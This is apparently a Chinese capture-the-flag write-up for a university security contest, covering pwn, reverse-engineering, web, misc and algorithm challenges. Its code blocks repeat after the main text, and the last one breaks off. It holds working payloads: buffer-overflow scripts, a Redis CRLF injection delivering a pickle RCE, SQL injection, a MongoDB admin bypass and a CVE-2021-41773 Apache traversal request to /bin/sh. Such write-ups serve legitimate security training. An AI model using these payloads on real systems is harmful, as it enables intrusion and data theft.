# 高校网络安全管理运维赛 Writeup

> 原文: https://www.ctfiot.com/180828.html
> ID: 180828

PWN

babypwn

from pwn import * io = remote("prob07.contest.pku.edu.cn", 10007)# io = process("./pwn")context.log_level = "debug"
io.sendlineafter(b"Please input your token: ", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendafter(b"Enter your username:", b"root")# gdb.attach(io, "b* 0x4011E9")# pause()io.sendafter(b"Enter the password:", b"a" * 0x38 + p64(0x40117A))io.interactive()#flag{KooD1EijiemeePH8ieNei2XoL8iCh5de}

Login

username: admin password: 1q2w3e4r

登录成功后发现回显数据有很明显的ELF文件头

接收数据写入文件

io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendlineafter(b"Username:", b"admin")io.sendlineafter(b"Password:", b"1q2w3e4r")io.recvuntil(b"Core dumpedn")
hex_data = io.recvall()hex_data += io.recvall()# print(hex_data)# 写入文件with open("pwn", "wb") as file:    file.write(hex_data)

from pwn import *io = remote("prob04.contest.pku.edu.cn", 10004)context.log_level = "debug"
# io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")# io.sendlineafter(b"Username:", b"admin")# io.sendlineafter(b"Password:", b"1q2w3e4r")# io.recvuntil(b"Core dumpedn")
# hex_data = io.recvall()# hex_data += io.recvall()

# # print(hex_data)
# # 写入文件# with open("pwn", "wb") as file:#     file.write(hex_data)
io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendlineafter(b"Username:", b"admin")payload = b"x00" * 0x98 + p64(0x40127E)io.sendlineafter(b"Password:", payload)io.interactive()
#flag{loGiN_SuccESs_COngRatUlatIOn}

RE

babyre

upx -d babyre

逆向大致确定需要输入4个数字满足4个函数的条件就能获得flag

part1:

一个简单的加减法，这里可以确定第一部分的数字是3821413212

part2:

用gpt写了个脚本去爆破a1的值

def find_a1():    for a1 in range(0, 0xFFFFFFFF + 1):  # 遍历所有可能的32位无符号整数        if (a1 + (a1 | 0x8E03BEC3) - 3 * (a1 & 0x71FC413C)) == 0x902C7FF8:            return a1    return None
result = find_a1()if result is not None:    print(f"满足条件的a1值是: {result:#x}")else:    print("没有找到满足条件的a1值")  #98124621

part3:

同样的用gpt写个脚本

def check_expression(a1):      # 原始表达式      expression = (          4 * ((~a1 & 0xA8453437) + 2 * ~(~a1 | 0xA8453437))          + -3 * (~a1 | 0xA8453437)          + 3 * ~(a1 | 0xA8453437)          - (-10 * (a1 & 0xA8453437) + (a1 ^ 0xA8453437))      )      # 检查表达式是否等于551387557      return expression == 551387557    # 穷举所有可能的32位整数  for a1 in range(2**32):      if check_expression(a1):          print(f"找到满足条件的a1值：{a1}")          break  # 找到后退出循环  else:      print("没有找到满足条件的a1值")    #78769651

part4:

一开始也想像上面一样让gpt写个脚本爆破的写出来下面这个，但是爆破了半个小时爆不出来，就去看代码了，发现数字不对，这里是无符号数，所以改用c写了个大概的

python的失败脚本:

def check_expression(a1):      # 原始表达式      expression = (          11 * ~(a1 ^ 0xE33B67BD)          + 4 * ~(~a1 | 0xE33B67BD)          - (6 * (a1 & 0xE33B67BD) + 12 * ~(a1 | 0xE33B67BD))          + 3 * (a1 & 0xD2C7FC0C)          - 5 * a1          - 2 * ~(a1 | 0xD2C7FC0C)          + ~(a1 | 0x2D3803F3)          + 4 * (a1 & 0x2D3803F3)          + 2 * (a1 | 0x2D3803F3)      )      # 检查表达式是否等于-837785892      return expression == -837785892    # 穷举所有可能的32位整数（这里我们只检查0到2**32-1的范围）  for a1 in range(2**32):      if check_expression(a1):          print(f"找到满足条件的a1值：{a1}")          break  # 找到后退出循环  else:      print("没有找到满足条件的a1值（在给定范围内）")

#include <stdio.h>  #include <stdint.h>    int main() {      for (uint32_t a1 = 0; a1 <= 268435456; a1++) {          if ((11 * ~(a1 ^ 0xE33B67BD)                  + 4 * ~(~a1 | 0xE33B67BD)                  - (6 * (a1 & 0xE33B67BD)                      + 12 * ~(a1 | 0xE33B67BD))                  + 3 * (a1 & 0xD2C7FC0C)                  - 5 * a1                  - 2 * ~(a1 | 0xD2C7FC0C)                  + ~(a1 | 0x2D3803F3)                  + 4 * (a1 & 0x2D3803F3)                  + 2 * (a1 | 0x2D3803F3)) == 0xCE1066DC) {              printf("%un", a1); // 添加换行符以改善输出可读性              break;          }      }      return 0; // 最好添加return语句，尽管在main函数中不是必需的  }//67321987

easyre

flag{B4se64_1s_s0_e4sy}

WEB

pyssrf

redis = Redis(host='127.0.0.1', port=6379)
def get_result(url):    url_key=hashlib.md5(url.encode()).hexdigest()    res=redis.get(url_key)    if res:        return pickle.loads(base64.b64decode(res))    else:        try:            print(url)            info = urllib.request.urlopen(url)            res = info.read()            pickres=pickle.dumps(res)            b64res=base64.b64encode(pickres)            redis.set(url_key,b64res,ex=300)            return res        except urllib.error.URLError as e:            print(e)

这里寻找python低版本历史存在请求走私的cve漏洞：https://security.snyk.io/package/linux/debian:10/python3.7

找到两个符合版本的漏洞：

CVE-2019-9740/CVE-2019-9947

127.0.0.1:6379?rnSET e3a0c1ff4834a297fbb33e72e1f75367 <base编码的exp>rnquit127.0.0.1:6379?%0d%0aSET e3a0c1ff4834a297fbb33e72e1f75367 <base编码的exp>%0d%0aquit

class cmd():    def __reduce__(self):        return (exec,("raise Exception(__import__('os').popen('cat /flag').read())",))

c = cmd()
c = pickle.dumps(c)#cd = c.lower()print(base64.b64encode(c))

?url=127.0.0.1:6379?%0D%0ASET%2052ea9955d173174df188ce1013a56c97%20gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0D%0Aquit

上面的md5值是自定义的一个端口，这里访问

?url=127.0.0.1:10244即可拿到flag。

fileit

在源码中发现xxe的典型代码，于是发送 xxe 攻击payload，但是无回显。

于是，利用VPS发送带外XXE攻击payload。

在VPS上新建xxe.php、xxe.xml两个文件：

python -m http.server 8888

phpsql

username=admin&password=admin'||1#

Messy Mongo

app.use('/api/*', jwt({ secret }))
app.patch('/api/login', async (c) => {  //修改账号  const { user } = c.get('jwtPayload')    const delta = await c.req.json()  const newname = delta['username']  assert.notEqual(newname, 'admin')  await users.updateOne({ username: user }, [{ $set: delta }])  if (newname) {    await todos.updateMany({ user }, [{ $set: { user: delta['username'] } }])  }  return c.json(0)})

这里可以利用mongodb聚合特性中的字符串操作来绕过assert.notEqual并且修改用户为admin：

https://www.jianshu.com/p/42845d117587。

登录ctfer用户拿到jwt令牌，然后先发送一个修改用户名为Admin的请求：

{"username":"Admin"}

{"username":{"$toLower":"$username"}}

MISC

zip

输入密钥的check不严谨，只需要开头五个字符是flag{即可，因此我们可以通过127也就是0x7f来删除前面五个字符，在ASCII中，127表示的就是del删除

故构造payload

flag{x7fx7fx7fx7fx7f + token

from pwn import *# io = process("./zip")io = remote("prob03.contest.pku.edu.cn", 10003)
# context.log_level = "debug"io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendlineafter(b"your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl")# gdb.attach(io, "b* 0x401757")# pause()io.sendlineafter(b"your flag:", b"flag{" + b"x7fx7fx7fx7fx7f" + b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl")io.interactive()
#flag{N3v3r-90Nn4-91v3-Y0u-uP}

签到

synt{guvf-vf-gur-fvtava-dhvm}
ROT13:flag{this-is-the-signin-quiz}

钓鱼邮件

ZmxhZ3tXZUxDb21lVG99> base64:flag{WeLComeTo}

flag{PhishHuntiNG}

搜索 DKIM eml ，github中有手动验证教程：

https://github.com/kmille/dkim-verify

根据教程中获取 PublicKey 方法，构造

{}._domainkey.{}.".format(selector, domain)即：default._domainkey.foobar-edu-cn.com
dig txt +short default._domainkey.foobar-edu-cn.com dig访问获得 flag_part2=_Kn0wH0wt0_

dig txt +short foobar-edu-cn.comhint: Find and concatenate all three parts to obtain the complete flag3.

dig txt +short _dmarc.foobar-edu-cn.comflag_part3=ANAlys1sDNS}

dig txt +short spf.foobar-edu-cn.comflag_part1={N0wY0u

flag{N0wY0u_Kn0wH0wt0_ANAlys1sDNS}

easyshell

bkcrack -C flag.zip -c secret2.txt -P secret2.zip  -p secret2.txt> key: e0c271a4 cbd76d08 8d707128
bkcrack -C flag.zip -k e0c271a4 cbd76d08 8d707128 -U out.zip 123456> 修改压缩包密码后，secret1.txt 得到 flag

gateway

目录 "html_src/cgi-bin/baseinfoSet.json" 中包含 "baseinfoSet_USERPASSWORD"
"106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129&",
> replace106 112 101 107 127 101 104 49 57 56 53 56 54 56 49 51 51 105 56 103 106 49 56 50 56 103 102 56 52 101 104 102 105 53 101 53 102 129 
> from decimaljpek.eh1985868133i8gj1828gf84ehfi5e5f.
> rot22flag.ad1985868133e8cf1828cb84adbe5a5b.

f or r

SJTUCTF WP: https://github.com/BeaCox/myBlog/tree/ebb8b6694ca7d9d998dcfdd703137240a5da25f9/posts/sjtuctf-2024-wp

secret DB

data = open('secret.db', 'rb').read().split(b'x01x0f')dict = {}
for tmp in data:    dict[tmp[0]] = tmp[1]
out = ''for i in range(42): # 1    try:        out += chr(dict[i])    except:        out += '?'
print(out)#  ?ag{f62 1bf0-923c-4ba6-?2d7-ffabba4e8f0b}

flag{f6291bf0-923c-4ba6-?2d7-ffabba4e8f0b}

flag{f6291bf0-923c-4ba6-92d7-ffabba4e8f0b}

Apache

from flask import Flask,request,send_fileimport socket
app = Flask("webserver")
@app.route('/',methods=["GET"])def index():    return send_file(__file__)
@app.route('/nc',methods=["POST"])def nc():    try:        dstport=int(request.form['port'])        data=request.form['data']        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.settimeout(1)        s.connect(('127.0.0.1', dstport))        s.send(data.encode())        recvdata = b''        while True:            chunk = s.recv(2048)            if not chunk.strip():                break            else:                recvdata += chunk                continue        return recvdata    except Exception as e:        return str(e)

app.run(host="0.0.0.0",port=8080,threaded=True)

2.这里存在SSRF，利用socket来创建一个网络连接，可以发现data参数可以构造任意请求、port参数可以构造任意端口。由于是http服务，默认端口是80，虽然ngnix做了反向代理隐藏了版本号，但是探测80端口依旧存在连接超时的响应。

3.根据apache版本查找历史漏洞：CVE-2021-41773 文章：

https://blog.csdn.net/qq_59975439/article/details/125225949

查看给的http.conf配置文件发现配置项符合漏洞要求，直接拿文章的poc来构造exp：

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-Modified-Since: Wed, 19 Jan 2022 06:29:11 GMTIf-None-Match: "29cd-5d5e980f21bc0-gzip"Cache-Control: max-age=0Content-Length: 14
echo;cat /flag

port=80&data=%50%4f%53%54%20%2f%63%67%69%2d%62%69%6e%2f%2e%25%32%65%2f%2e%25%32%65%2f%2e%25%32%65%2f%2e%25%32%65%2f%62%69%6e%2f%73%68%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%4f%57%36%34%3b%20%72%76%3a%34%39%2e%30%29%20%47%65%63%6b%6f%2f%32%30%31%30%30%31%30%31%20%46%69%72%65%66%6f%78%2f%34%39%2e%30%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%2a%2f%2a%3b%71%3d%30%2e%38%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%38%2c%65%6e%2d%55%53%3b%71%3d%30%2e%35%2c%65%6e%3b%71%3d%30%2e%33%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0a%44%4e%54%3a%20%31%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0a%49%66%2d%4d%6f%64%69%66%69%65%64%2d%53%69%6e%63%65%3a%20%57%65%64%2c%20%31%39%20%4a%61%6e%20%32%30%32%32%20%30%36%3a%32%39%3a%31%31%20%47%4d%54%0a%49%66%2d%4e%6f%6e%65%2d%4d%61%74%63%68%3a%20%22%32%39%63%64%2d%35%64%35%65%39%38%30%66%32%31%62%63%30%2d%67%7a%69%70%22%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6d%61%78%2d%61%67%65%3d%30%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%34%0a%0a%65%63%68%6f%3b%63%61%74%20%2f%66%6c%61%67%0a

Algorithm

secretbit

from secret import flagfrom random import randrange, shufflefrom Crypto.Util.number import bytes_to_long, long_to_bytesfrom tqdm import tqdmimport ast
def instance(m, n):    start = list(range(m))    shuffle(start)    # print(start)    for i in range(m):        now = start[i]        this_turn = False        # print("i == " + str(i))        # print("now == " + str(now))        for j in range(n-1):            if now == i:                this_turn = True                break            now = start[now]            # print("start[now] == " + str(now))        if not this_turn:            return 0    return 1

def leak(m, n, times=2000):  message = [instance(m, n) for _ in range(times)]  return message
MAX_M = 400MIN_M = 200flag_b = [int(i) for i in bin(bytes_to_long(flag))[2:]]leak_message = []
# for bi in tqdm(flag_b):#     while True:#         tmp_m0 = randrange(MIN_M, MAX_M)#         tmp_n0 = randrange(int(tmp_m0//2), int(tmp_m0 * 8 // 9))#         tmp_m1 = randrange(MIN_M, MAX_M)#         tmp_n1 = randrange(int(tmp_m1//2), int(tmp_m1 * 8 // 9))#         if abs(tmp_m0-tmp_m1-tmp_n0+tmp_n1) > MAX_M // 5:#             break#     choose_m = tmp_m0 if bi == 0 else tmp_m1#     choose_n = tmp_n0 if bi == 0 else tmp_n1    # leak_message.append([[tmp_m0, tmp_n0], [tmp_m1, tmp_n1], leak(choose_m, choose_n)])
# open('data.txt', 'w').write(str(leak_message))flag_content = b''myflag_b = []leak_msg1 = []leak_msg2 = []# leak_message = def countNum(idx, leak_message):    num = 0    for i in range(len(leak_message[idx][2])):        if leak_message[idx][2][i] == 1:            num += 1    return num

def ret2bit(idx, leak_message):    mark = 0    list1 = leak_message[idx][0]    # print(list1)    list2 = leak_message[idx][1]    # print(list2)    normal_num = countNum(idx, leak_message)    print("normal_num == " + str(normal_num))    leak_msg1.append([list1, list2, leak(list1[0], list1[1])])    count_num = countNum(idx, leak_msg1)    print("count_num == " + str(count_num))    leak_msg2.append([list1, list2, leak(list2[0], list2[1])])    count_num2 = countNum(idx, leak_msg2)    print("count_num2 == " + str(count_num2))    if abs(normal_num - count_num) > abs(normal_num - count_num2):        return 1    return 0
# # 从文件中读取数据字符串with open('data.txt', 'r') as file:    data_str = file.read()
# 使用 ast 模块的 literal_eval 函数将字符串转换为列表对象leak_message = ast.literal_eval(data_str)# print(leak_message)
# for i in range(len(leak_message)):print(flag_b)myflag_b.insert(0, 0)for i in range(len(leak_message)):    myflag_b.append(ret2bit(i, leak_message))    print(myflag_b)    flag_int = int(''.join(map(str, myflag_b)), 2)    flag_bytes = long_to_bytes(flag_int)    print(flag_bytes)

# flag_b = [1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!

PS:团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@LYK0r4师傅


```
from pwn import * io = remote("prob07.contest.pku.edu.cn", 10007)# io = process("./pwn")context.log_level = "debug"
io.sendlineafter(b"Please input your token: ", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendafter(b"Enter your username:", b"root")# gdb.attach(io, "b* 0x4011E9")# pause()io.sendafter(b"Enter the password:", b"a" * 0x38 + p64(0x40117A))io.interactive()#flag{KooD1EijiemeePH8ieNei2XoL8iCh5de}
```



```
username: admin password: 1q2w3e4r
```



```
io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendlineafter(b"Username:", b"admin")io.sendlineafter(b"Password:", b"1q2w3e4r")io.recvuntil(b"Core dumpedn")
hex_data = io.recvall()hex_data += io.recvall()# print(hex_data)# 写入文件with open("pwn", "wb") as file:    file.write(hex_data)
```



```
from pwn import *io = remote("prob04.contest.pku.edu.cn", 10004)context.log_level = "debug"
# io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")# io.sendlineafter(b"Username:", b"admin")# io.sendlineafter(b"Password:", b"1q2w3e4r")# io.recvuntil(b"Core dumpedn")
# hex_data = io.recvall()# hex_data += io.recvall()

# # print(hex_data)
# # 写入文件# with open("pwn", "wb") as file:#     file.write(hex_data)
io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendlineafter(b"Username:", b"admin")payload = b"x00" * 0x98 + p64(0x40127E)io.sendlineafter(b"Password:", payload)io.interactive()
#flag{loGiN_SuccESs_COngRatUlatIOn}
```



```
upx -d babyre
```



```
def find_a1():    for a1 in range(0, 0xFFFFFFFF + 1):  # 遍历所有可能的32位无符号整数        if (a1 + (a1 | 0x8E03BEC3) - 3 * (a1 & 0x71FC413C)) == 0x902C7FF8:            return a1    return None
result = find_a1()if result is not None:    print(f"满足条件的a1值是: {result:#x}")else:    print("没有找到满足条件的a1值")  #98124621
```



```
def check_expression(a1):      # 原始表达式      expression = (          4 * ((~a1 & 0xA8453437) + 2 * ~(~a1 | 0xA8453437))          + -3 * (~a1 | 0xA8453437)          + 3 * ~(a1 | 0xA8453437)          - (-10 * (a1 & 0xA8453437) + (a1 ^ 0xA8453437))      )      # 检查表达式是否等于551387557      return expression == 551387557    # 穷举所有可能的32位整数  for a1 in range(2**32):      if check_expression(a1):          print(f"找到满足条件的a1值：{a1}")          break  # 找到后退出循环  else:      print("没有找到满足条件的a1值")    #78769651
```



```
def check_expression(a1):      # 原始表达式      expression = (          11 * ~(a1 ^ 0xE33B67BD)          + 4 * ~(~a1 | 0xE33B67BD)          - (6 * (a1 & 0xE33B67BD) + 12 * ~(a1 | 0xE33B67BD))          + 3 * (a1 & 0xD2C7FC0C)          - 5 * a1          - 2 * ~(a1 | 0xD2C7FC0C)          + ~(a1 | 0x2D3803F3)          + 4 * (a1 & 0x2D3803F3)          + 2 * (a1 | 0x2D3803F3)      )      # 检查表达式是否等于-837785892      return expression == -837785892    # 穷举所有可能的32位整数（这里我们只检查0到2**32-1的范围）  for a1 in range(2**32):      if check_expression(a1):          print(f"找到满足条件的a1值：{a1}")          break  # 找到后退出循环  else:      print("没有找到满足条件的a1值（在给定范围内）")
```



```
#include <stdio.h>  #include <stdint.h>    int main() {      for (uint32_t a1 = 0; a1 <= 268435456; a1++) {          if ((11 * ~(a1 ^ 0xE33B67BD)                  + 4 * ~(~a1 | 0xE33B67BD)                  - (6 * (a1 & 0xE33B67BD)                      + 12 * ~(a1 | 0xE33B67BD))                  + 3 * (a1 & 0xD2C7FC0C)                  - 5 * a1                  - 2 * ~(a1 | 0xD2C7FC0C)                  + ~(a1 | 0x2D3803F3)                  + 4 * (a1 & 0x2D3803F3)                  + 2 * (a1 | 0x2D3803F3)) == 0xCE1066DC) {              printf("%un", a1); // 添加换行符以改善输出可读性              break;          }      }      return 0; // 最好添加return语句，尽管在main函数中不是必需的  }//67321987
```



```
flag{B4se64_1s_s0_e4sy}
```



```
redis = Redis(host='127.0.0.1', port=6379)
def get_result(url):    url_key=hashlib.md5(url.encode()).hexdigest()    res=redis.get(url_key)    if res:        return pickle.loads(base64.b64decode(res))    else:        try:            print(url)            info = urllib.request.urlopen(url)            res = info.read()            pickres=pickle.dumps(res)            b64res=base64.b64encode(pickres)            redis.set(url_key,b64res,ex=300)            return res        except urllib.error.URLError as e:            print(e)
```



```
127.0.0.1:6379?rnSET e3a0c1ff4834a297fbb33e72e1f75367 <base编码的exp>rnquit127.0.0.1:6379?%0d%0aSET e3a0c1ff4834a297fbb33e72e1f75367 <base编码的exp>%0d%0aquit
```



```
class cmd():    def __reduce__(self):        return (exec,("raise Exception(__import__('os').popen('cat /flag').read())",))

c = cmd()
c = pickle.dumps(c)#cd = c.lower()print(base64.b64encode(c))
```



```
?url=127.0.0.1:6379?%0D%0ASET%2052ea9955d173174df188ce1013a56c97%20gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0D%0Aquit
```



```
python -m http.server 8888
```



```
username=admin&password=admin'||1#
```



```
app.use('/api/*', jwt({ secret }))
app.patch('/api/login', async (c) => {  //修改账号  const { user } = c.get('jwtPayload')    const delta = await c.req.json()  const newname = delta['username']  assert.notEqual(newname, 'admin')  await users.updateOne({ username: user }, [{ $set: delta }])  if (newname) {    await todos.updateMany({ user }, [{ $set: { user: delta['username'] } }])  }  return c.json(0)})
```



```
{"username":"Admin"}
```



```
{"username":{"$toLower":"$username"}}
```



```
flag{x7fx7fx7fx7fx7f + token
```



```
from pwn import *# io = process("./zip")io = remote("prob03.contest.pku.edu.cn", 10003)
# context.log_level = "debug"io.sendlineafter(b"Please input your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl5oFLGCL_134AkS-89M8nG7kzl127hf29584=")io.sendlineafter(b"your token:", b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl")# gdb.attach(io, "b* 0x401757")# pause()io.sendlineafter(b"your flag:", b"flag{" + b"x7fx7fx7fx7fx7f" + b"522:MEUCIQCosOLImE2i11gtdIBeP9r5hu3E3FWIZdqixPB_QpEjwAIgS009Snrl")io.interactive()
#flag{N3v3r-90Nn4-91v3-Y0u-uP}
```



```
synt{guvf-vf-gur-fvtava-dhvm}
ROT13:flag{this-is-the-signin-quiz}
```



```
ZmxhZ3tXZUxDb21lVG99> base64:flag{WeLComeTo}
```



```
flag{PhishHuntiNG}
```



```
{}._domainkey.{}.".format(selector, domain)即：default._domainkey.foobar-edu-cn.com
dig txt +short default._domainkey.foobar-edu-cn.com dig访问获得 flag_part2=_Kn0wH0wt0_
```



```
dig txt +short foobar-edu-cn.comhint: Find and concatenate all three parts to obtain the complete flag3.
```



```
dig txt +short _dmarc.foobar-edu-cn.comflag_part3=ANAlys1sDNS}
```



```
dig txt +short spf.foobar-edu-cn.comflag_part1={N0wY0u
```



```
flag{N0wY0u_Kn0wH0wt0_ANAlys1sDNS}
```



```
bkcrack -C flag.zip -c secret2.txt -P secret2.zip  -p secret2.txt> key: e0c271a4 cbd76d08 8d707128
bkcrack -C flag.zip -k e0c271a4 cbd76d08 8d707128 -U out.zip 123456> 修改压缩包密码后，secret1.txt 得到 flag
```



```
目录 "html_src/cgi-bin/baseinfoSet.json" 中包含 "baseinfoSet_USERPASSWORD"
"106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129&",
> replace106 112 101 107 127 101 104 49 57 56 53 56 54 56 49 51 51 105 56 103 106 49 56 50 56 103 102 56 52 101 104 102 105 53 101 53 102 129 
> from decimaljpek.eh1985868133i8gj1828gf84ehfi5e5f.
> rot22flag.ad1985868133e8cf1828cb84adbe5a5b.
```



```
SJTUCTF WP: https://github.com/BeaCox/myBlog/tree/ebb8b6694ca7d9d998dcfdd703137240a5da25f9/posts/sjtuctf-2024-wp
```



```
data = open('secret.db', 'rb').read().split(b'x01x0f')dict = {}
for tmp in data:    dict[tmp[0]] = tmp[1]
out = ''for i in range(42): # 1    try:        out += chr(dict[i])    except:        out += '?'
print(out)#  ?ag{f62 1bf0-923c-4ba6-?2d7-ffabba4e8f0b}
```



```
flag{f6291bf0-923c-4ba6-?2d7-ffabba4e8f0b}
```



```
flag{f6291bf0-923c-4ba6-92d7-ffabba4e8f0b}
```



```
from flask import Flask,request,send_fileimport socket
app = Flask("webserver")
@app.route('/',methods=["GET"])def index():    return send_file(__file__)
@app.route('/nc',methods=["POST"])def nc():    try:        dstport=int(request.form['port'])        data=request.form['data']        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.settimeout(1)        s.connect(('127.0.0.1', dstport))        s.send(data.encode())        recvdata = b''        while True:            chunk = s.recv(2048)            if not chunk.strip():                break            else:                recvdata += chunk                continue        return recvdata    except Exception as e:        return str(e)

app.run(host="0.0.0.0",port=8080,threaded=True)
```



```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-Modified-Since: Wed, 19 Jan 2022 06:29:11 GMTIf-None-Match: "29cd-5d5e980f21bc0-gzip"Cache-Control: max-age=0Content-Length: 14
echo;cat /flag
```



```
port=80&data=%50%4f%53%54%20%2f%63%67%69%2d%62%69%6e%2f%2e%25%32%65%2f%2e%25%32%65%2f%2e%25%32%65%2f%2e%25%32%65%2f%62%69%6e%2f%73%68%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%4f%57%36%34%3b%20%72%76%3a%34%39%2e%30%29%20%47%65%63%6b%6f%2f%32%30%31%30%30%31%30%31%20%46%69%72%65%66%6f%78%2f%34%39%2e%30%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%2a%2f%2a%3b%71%3d%30%2e%38%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%38%2c%65%6e%2d%55%53%3b%71%3d%30%2e%35%2c%65%6e%3b%71%3d%30%2e%33%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0a%44%4e%54%3a%20%31%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0a%49%66%2d%4d%6f%64%69%66%69%65%64%2d%53%69%6e%63%65%3a%20%57%65%64%2c%20%31%39%20%4a%61%6e%20%32%30%32%32%20%30%36%3a%32%39%3a%31%31%20%47%4d%54%0a%49%66%2d%4e%6f%6e%65%2d%4d%61%74%63%68%3a%20%22%32%39%63%64%2d%35%64%35%65%39%38%30%66%32%31%62%63%30%2d%67%7a%69%70%22%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6d%61%78%2d%61%67%65%3d%30%0a%43%6f%6e%74%65%6e%74%2d%